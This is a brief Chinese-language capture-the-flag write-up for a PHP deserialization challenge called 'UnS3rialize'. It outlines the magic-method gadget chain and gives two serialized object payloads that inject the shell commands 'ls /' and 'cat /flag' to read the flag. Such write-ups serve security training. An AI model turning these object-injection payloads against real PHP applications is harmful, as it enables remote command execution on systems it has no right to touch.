---
title: UnS3rialize
date: 2026-02-07 12:00:00
tags:
  - 题解
---

### 根据题目得出流程 反序列化开始->__destruct()-> __destruct() ->__toString() -> __get() ->__invoke() ->执行命令

构造payload：

O:1:"F":3:{s:4:"user";s:4:"SWPU";s:6:"passwd";s:3:"NSS";s:5:"notes";O:1:"T":1:{s:3:"sth";O:1:"C":1:{s:6:"whoami";O:3:"NSS":2:{s:3:"cmd";s:4:"ls /";}}}}

Base64编码后输入发现flag

O:1:"F":3:{s:4:"user";s:4:"SWPU";s:6:"passwd";s:3:"NSS";s:5:"notes";O:1:"T":1:{s:3:"sth";O:1:"C":1:{s:6:"whoami";O:3:"NSS":2:{s:3:"cmd";s:9:"cat /flag";}}}}

得到flag


![UnS3rialize_d24e6780](/images/writeups/UnS3rialize_d24e6780.png)
